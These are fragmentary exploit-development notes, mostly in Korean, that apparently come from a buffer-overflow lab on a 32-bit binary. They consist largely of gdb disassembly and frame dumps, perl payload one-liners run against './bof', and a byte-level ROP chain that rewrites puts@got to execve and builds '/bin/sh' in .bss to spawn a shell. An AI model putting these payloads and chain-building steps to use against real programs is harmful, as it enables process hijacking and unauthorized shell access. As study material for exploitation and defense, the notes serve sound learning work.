   0x0804854b <+0>:	lea    0x4(%esp),%ecx
   0x0804854f <+4>:	and    $0xfffffff0,%esp
   0x08048552 <+7>:	pushl  -0x4(%ecx)
   0x08048555 <+10>:	push   %ebp
   0x08048556 <+11>:	mov    %esp,%ebp
   0x08048558 <+13>:	push   %ecx
   0x08048559 <+14>:	sub    $0x874,%esp      start main
   0x0804855f <+20>:	mov    %ecx,%eax
   0x08048561 <+22>:	cmpl   $0x2,(%eax)
   0x08048564 <+25>:	je     0x8048580 <main+53>
   0x08048566 <+27>:	sub    $0xc,%esp
   0x08048569 <+30>:	push   $0x80486f0
   0x0804856e <+35>:	call   0x80483f0 <puts@plt>
   0x08048573 <+40>:	add    $0x10,%esp
   0x08048576 <+43>:	sub    $0xc,%esp
   0x08048579 <+46>:	push   $0x1
   0x0804857b <+48>:	call   0x8048400 <exit@plt>
   0x08048580 <+53>:	mov    0x4(%eax),%eax
   0x08048583 <+56>:	add    $0x4,%eax
   0x08048586 <+59>:	mov    (%eax),%eax
   0x08048588 <+61>:	sub    $0x4,%esp
   0x0804858b <+64>:	push   $0x80
   0x08048590 <+69>:	push   %eax
   0x08048591 <+70>:	lea    -0x86e(%ebp),%eax
   0x08048597 <+76>:	push   %eax
   0x08048598 <+77>:	call   0x8048430 <strncpy@plt>
   0x0804859d <+82>:	add    $0x10,%esp
   0x080485a0 <+85>:	test   %eax,%eax
   0x080485a2 <+87>:	jne    0x80485be <main+115>
   0x080485a4 <+89>:	sub    $0xc,%esp
   0x080485a7 <+92>:	push   $0x804871e
   0x080485ac <+97>:	call   0x80483f0 <puts@plt>
   0x080485b1 <+102>:	add    $0x10,%esp
   0x080485b4 <+105>:	sub    $0xc,%esp
   0x080485b7 <+108>:	push   $0x1
   0x080485b9 <+110>:	call   0x8048400 <exit@plt>
   0x080485be <+115>:	sub    $0x8,%esp
   0x080485c1 <+118>:	lea    -0x86e(%ebp),%eax
   0x080485c7 <+124>:	push   %eax
   0x080485c8 <+125>:	push   $0x8048732
   0x080485cd <+130>:	call   0x80483c0 <printf@plt>
   0x080485d2 <+135>:	add    $0x10,%esp
   0x080485d5 <+138>:	sub    $0x8,%esp
   0x080485d8 <+141>:	push   $0x8048748
   0x080485dd <+146>:	lea    -0x86e(%ebp),%eax
   0x080485e3 <+152>:	push   %eax
   0x080485e4 <+153>:	call   0x8048420 <fopen@plt>
   0x080485e9 <+158>:	add    $0x10,%esp
   0x080485ec <+161>:	mov    %eax,-0xc(%ebp)
   0x080485ef <+164>:	pushl  -0xc(%ebp)
   0x080485f2 <+167>:	push   $0x7e2
   0x080485f7 <+172>:	push   $0x1
   0x080485f9 <+174>:	lea    -0x7ee(%ebp),%eax
   0x080485ff <+180>:	push   %eax
   0x08048600 <+181>:	call   0x80483d0 <fread@plt>
   0x08048605 <+186>:	add    $0x10,%esp
   0x08048608 <+189>:	sub    $0xc,%esp
   0x0804860b <+192>:	lea    -0x7ee(%ebp),%eax
   0x08048611 <+198>:	push   %eax
   0x08048612 <+199>:	call   0x8048637 <cat_file>
   0x08048617 <+204>:	add    $0x10,%esp
   0x0804861a <+207>:	sub    $0xc,%esp
   0x0804861d <+210>:	push   $0x804874a
   0x08048622 <+215>:	call   0x80483f0 <puts@plt>
   0x08048627 <+220>:	add    $0x10,%esp
   0x0804862a <+223>:	mov    $0x1,%eax
   0x0804862f <+228>:	mov    -0x4(%ebp),%ecx
   0x08048632 <+231>:	leave  
   0x08048633 <+232>:	lea    -0x4(%ecx),%esp
   0x08048636 <+235>:	ret    
End of assembler dump.

enable_aslr
(gdb) info frame
Stack level 0, frame at 0xbf9a7a24:
 eip = 0xbfffe894; saved eip = 0x90909090
 called by frame at 0xbf9a7a28
 Arglist at 0xbf9a7a1c, args: 
 Locals at 0xbf9a7a1c, Previous frame's sp is 0xbf9a7a24
 Saved registers:
  eip at 0xbf9a7a20
  
Stack level 0, frame at 0xbfecc4b4:
 eip = 0xbfffe894; saved eip = 0x90909090
 called by frame at 0xbfecc4b8
 Arglist at 0xbfecc4ac, args: 
 Locals at 0xbfecc4ac, Previous frame's sp is 0xbfecc4b4
 Saved registers:
  eip at 0xbfecc4b0

  (gdb) info frame
Stack level 0, frame at 0xbfcdb4d4:
 eip = 0xbfffe894; saved eip = 0x90909090
 called by frame at 0xbfcdb4d8
 Arglist at 0xbfcdb4cc, args: 
 Locals at 0xbfcdb4cc, Previous frame's sp is 0xbfcdb4d4
 Saved registers:
  eip at 0xbfcdb4d0
===================================

set disassembly-flavor intel 
0x08048000은 data 영역의 주소입니다.
disas cat_file
   0x08048643 <+12>: lea    -0x20(%ebp),%eax -> 32
   0x08048646 <+15>: push   %eax
   0x08048647 <+16>: call   0x80483e0 <strcpy@plt>
gdb-peda$ p execve
$3 = {<text variable, no debug info>} 0xb7e068c0 <execve>
(gdb) print execl
$1 = {<text variable, no debug info>} 0xb7 eb 6b 60 <__GI_execl>
0x08 04 80 70 - target \x01         0x8048070:  
Breakpoint 3, 0x08048559 in main ()

./bof "`perl -e 'print "A"x60,"\xa0\xca\x0a\x42","AAAA",            "\x14\x80\x04\x08"x3;'`"
                        56 + 4   execl 함수 주소   ret 자리 AAAA로 넘어감      target \x01
==============================
https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/

http://dooeui.blogspot.com/2013/09/stack-frame.html
http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf
https://www.thegeekstuff.com/2013/06/buffer-overflow/


https://m.blog.naver.com/PostView.nhn?blogId=go4693&logNo=221032991566&proxyReferer=https:%2F%2Fwww.google.com%2F
"`perl -e 'print "A"x36,"\x60\x6b\xeb\xb7","AAAA","\x14\x80\x04\x08"x3;'`" - original
"`perl -e 'print "A"x36,"\x60\x6b\xeb\xb7","AAAA","\x70\x80\x04\x08"x3;'`"

0xb7 eb 6b 60           0x08 04 80 70

__GI__IO_fread (buf=0xbfffe71a, size=1, count=2018, fp=0x0) at iofread.c:37
37 iofread.c: No such file or directory.

eip    = "\x53\x93\x42\x7E"  #7E429353 JMP ESP


0x53,0x93,0x42,0x7E

============================
https://m.blog.naver.com/go4693/221033855806
--
 80486c9:   5e                      pop    %esi
 80486ca:   5f                      pop    %edi
 80486cb:   5d                      pop    %ebp
 80486cc:   c3                      ret    
 80486cd:   8d 76 00                lea    0x0(%esi),%esi
->  PPR : 8 04 86 ca    0xca,0x86,0x04,0x08

   0x08048647 <+16>: call   0x80483e0 <strcpy@plt>
   0x0804864c <+21>: add    esp,0x10
   0x0804864f <+24>: sub    esp,0x8
   0x08048652 <+27>: lea    eax,[ebp-0x20]
   0x08048655 <+30>: push   eax
   0x08048656 <+31>: push   0x8048760
   0x0804865b <+36>: call   0x80483c0 <printf@plt>
   main
   0x08048622 <+215>:   call   0x80483f0 <puts@plt>
gdb-peda$ x/3i 0x80483f0
   0x80483f0 <puts@plt>:   jmp    DWORD PTR ds:0x804a018

-> <strcpy@plt> : 0x80483e0      - 0xe0,0x83,0x04,0x08,
   <puts@plt>  : 0x80483f0       - 0xf0,0x83,0x04,0x08,
   <puts@got>  : 0x804a018    - 0x18,0xa0,0x04,0x08,

gdb-peda$ p execve
$4 = {<text variable, no debug info>} 0xb7e068c0 <execve>
-> execve 주소 : 0xb7 e0 68 c0

  main : 0x80481cb --> 0xc0         c0    -0xcb,0x81,0x04,0x08   
  main : 0x80493c6 --> 0x68 ('h')   68    -0xc6,0x93,0x04,0x08
main : 0x8 04 95 2b --> 0x768d93eb     -0x9e,0x81,0x04,0x08
                     0xeb               - 0x2b,0x95,0x04,0x08
main : 0x804819c --> 0x54e020b7     b7    -0x9c,0x81,0x04,0x08

strcpy@plt + PPR + puts@got[0~4] + execve
{
0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x18,0xa0,0x04,0x08, 0xcb,0x81,0x04,0x08,
0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x19,0xa0,0x04,0x08, 0xc6,0x93,0x04,0x08,
0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x1a,0xa0,0x04,0x08, 0x2b,0x95,0x04,0x08,
0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x1b,0xa0,0x04,0x08, 0x9c,0x81,0x04,0x08
};

   0x0804a034 - 0x0804a038 is .bss
-> BSS : 0x0804a044 

eax            0xbf906bc8
esp            0xbf906bb4  차이 : 14(dec : 20)
-> 24 ret과의 거리 

8. BSS에 "/bin/sh"\00(null) 복사
/ :   main : 0x8048154 ("/lib/ld-linux.so.2")
b :   main : 0x8048157 ("b/ld-linux.so.2")
i :   main : 0x8048156 ("ib/ld-linux.so.2")
n :   main : 0x804815e ("nux.so.2")
/ :   main : 0x8048154 ("/lib/ld-linux.so.2")
s :   main : 0x8048162 ("so.2")
h :   main : 0x80480d8 --> 0x168 
00:   main : 0x8048007 --> 0x0            0x07,0x80,0x04,0x8,
   -> other way 0xb7 e0 68 e0 -> 0xe0,0x68,0xe0,0xb7

strcpy@plt + PPR + BSS[0] + "/ 주소",
{
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x44,0xa0,0x04,0x08, 0x54,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x45,0xa0,0x04,0x08, 0x57,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x46,0xa0,0x04,0x08, 0x56,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x47,0xa0,0x04,0x08, 0x5e,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x48,0xa0,0x04,0x08, 0x54,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x49,0xa0,0x04,0x08, 0x62,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x4a,0xa0,0x04,0x08, 0xd8,0x80,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x4b,0xa0,0x04,0x08, 0x07,0x80,0x04,0x8,
}


+ 마지막줄
puts@plt + DUMMY + BSS(처음 주소)+ NULL + NULL

0xf0,0x83,0x04,0x08, 0x90,0x90,0x90,0x90, 0x44,0xa0,0x04,0x08, 0x07,0x80,0x04,0x8, 0x07,0x80,0x04,0x8

"\x20\x83\x04\x08","BBBB","\x30\xa0\x04\x08","\x07\x80\x04\x08"x2'`"

x/x 0x080483e0
x/s 0x0804a044

-> <strcpy@plt> : 0x80483e0      - 0xe0,0x83,0x04,0x08,
   <puts@plt>  : 0x80483f0       - 0xf0,0x83,0x04,0x08,
   <puts@got>  : 0x804a018    - 0x18,0xa0,0x04,0x08,

gdb-peda$ x/x 0x804a018    - puts@got
0x804a018:  0xb7e068c0     - execve 주소 
gdb-peda$ x/s 0x0804a044   - BSS 주소 
0x804a044:  "/bin/sh\""    -/bin/sh

gdb-peda$ x/4x 0x0804a018
0x804a018:  0xc0  0x68  0xe0(->0xeb)  0xb7

출처: https://lastcard.tistory.com/70 [月光愛靑狼]